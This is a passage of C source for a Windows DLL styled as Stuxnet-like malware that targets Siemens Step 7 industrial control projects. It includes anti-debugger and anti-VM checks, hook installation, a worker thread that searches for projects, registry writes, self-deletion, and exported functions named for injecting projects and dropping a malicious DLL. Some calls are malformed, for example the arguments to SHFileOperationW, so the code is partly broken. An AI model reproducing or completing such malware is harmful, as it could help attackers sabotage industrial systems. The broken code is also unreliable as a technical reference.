            } while (FindNextFileW(hFind, &fd));
            FindClose(hFind);
        }
        dwTick = GetTickCount();
    }
    return 0;
}

static BOOL S7P_StartWorker(VOID) {
    g_S7pCtx.hStopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!g_S7pCtx.hStopEvent) return FALSE;
    g_S7pCtx.hThread = CreateThread(NULL, 0, S7P_WorkerThread, NULL, 0, NULL);
    if (!g_S7pCtx.hThread) {
        CloseHandle(g_S7pCtx.hStopEvent);
        g_S7pCtx.hStopEvent = NULL;
        return FALSE;
    }
    return TRUE;
}

static BOOL S7P_StopWorker(VOID) {
    if (g_S7pCtx.hStopEvent) {
        SetEvent(g_S7pCtx.hStopEvent);
    }
    if (g_S7pCtx.hThread) {
        WaitForSingleObject(g_S7pCtx.hThread, 5000);
        CloseHandle(g_S7pCtx.hThread);
        g_S7pCtx.hThread = NULL;
    }
    if (g_S7pCtx.hStopEvent) {
        CloseHandle(g_S7pCtx.hStopEvent);
        g_S7pCtx.hStopEvent = NULL;
    }
    return TRUE;
}

static BOOL S7P_SelfDestruct(VOID) {
    WCHAR szSearch[S7P_MAX_PATH];
    WIN32_FIND_DATAW fd;
    HANDLE hFind;
    GetWindowsDirectoryW(szSearch, S7P_MAX_PATH);
    wcscat_s(szSearch, S7P_MAX_PATH, L"\\*.s7p");
    hFind = FindFirstFileW(szSearch, &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                WCHAR szPath[S7P_MAX_PATH];
                WCHAR szXutils[S7P_MAX_PATH];
                wsprintfW(szPath, L"%s\\%s", g_S7pCtx.szWindowsPath, fd.cFileName);
                wsprintfW(szXutils, L"%s\\XUTILS", szPath);
                SHFileOperationW(NULL, FO_DELETE, szXutils, NULL, FO_DELETE);
                RemoveDirectoryW(szXutils);
            }
        } while (FindNextFileW(hFind, &fd));
        FindClose(hFind);
    }
    return TRUE;
}

static BOOL S7P_Execute(VOID) {
    HANDLE hMutex;
    if (!S7P_Init()) return FALSE;
    if (S7P_IsExpired()) {
        S7P_Cleanup();
        return FALSE;
    }
    hMutex = CreateMutexW(NULL, FALSE, L"StuxnetMutex_19790509");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        S7P_Cleanup();
        return FALSE;
    }
    if (S7P_CheckDebugger()) {
        CloseHandle(hMutex);
        S7P_Cleanup();
        return FALSE;
    }
    if (S7P_CheckVMware()) {
        CloseHandle(hMutex);
        S7P_Cleanup();
        return FALSE;
    }
    S7P_WriteRegistry();
    S7P_ReadRegistry();
    S7P_InstallHooks();
    S7P_StartWorker();
    while (WaitForSingleObject(g_S7pCtx.hStopEvent, 60000) != WAIT_OBJECT_0) {
        if (S7P_IsExpired()) {
            break;
        }
        DWORD dwCount = 0;
        S7P_FindStep7Projects(g_S7pCtx.szWindowsPath, &dwCount);
    }
    S7P_StopWorker();
    S7P_UninstallHooks();
    S7P_SelfDestruct();
    CloseHandle(hMutex);
    return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            break;
        case DLL_PROCESS_DETACH:
            S7P_Cleanup();
            break;
        default:
            break;
    }
    return TRUE;
}

DWORD WINAPI Export1(VOID) {
    HANDLE hThread;
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)S7P_Execute, NULL, 0, NULL);
    if (hThread) CloseHandle(hThread);
    return 0;
}

DWORD WINAPI Export2(VOID) {
    return S7P_InstallHooks() ? 0 : 1;
}

DWORD WINAPI Export3(VOID) {
    S7P_UninstallHooks();
    return 0;
}

DWORD WINAPI Export4(LPCWSTR szProjectPath) {
    return S7P_InjectProject(szProjectPath) ? 0 : 1;
}

DWORD WINAPI Export5(VOID) {
    DWORD dwCount = 0;
    S7P_FindStep7Projects(g_S7pCtx.szWindowsPath, &dwCount);
    return dwCount;
}

DWORD WINAPI Export6(VOID) {
    return S7P_CreateDirectoryStructure(g_S7pCtx.szProjectPath) ? 0 : 1;
}

DWORD WINAPI Export7(VOID) {
    return S7P_DropMaliciousDLL(g_S7pCtx.szProjectPath) ? 0 : 1;
}

DWORD WINAPI Export8(VOID) {
    return S7P_ModifyDataFile(g_S7pCtx.szProjectPath) ? 0 : 1;
}

DWORD WINAPI Export9(VOID) {
    return S7P_WriteRegistry() ? 0 : 1;
}

DWORD WINAPI Export10(VOID) {
    return S7P_ReadRegistry() ? 0 : 1;
}

DWORD WINAPI Export11(VOID) {
    return S7P_StartWorker() ? 0 : 1;
}

DWORD WINAPI Export12(VOID) {
    S7P_StopWorker();
    return 0;
}

DWORD WINAPI Export13(VOID) {
    S7P_SelfDestruct();
    return 0;
}

DWORD WINAPI Export14(VOID) {
    return (DWORD)g_S7pCtx.dwPid;
}

DWORD WINAPI Export15(VOID) {
    return S7P_VERSION;
}

DWORD WINAPI Export16(VOID) {
    return g_dwInfectionCount;
}

DWORD WINAPI Export17(VOID) {
    return g_dwProjectCount;
}

DWORD WINAPI Export18(VOID) {
    return g_dwRecordCount;
}

DWORD WINAPI Export19(VOID) {
    return (DWORD)g_S7pCtx.hMutex;
}

DWORD WINAPI Export20(VOID) {
    return S7P_IsExpired() ? 0 : 1;
}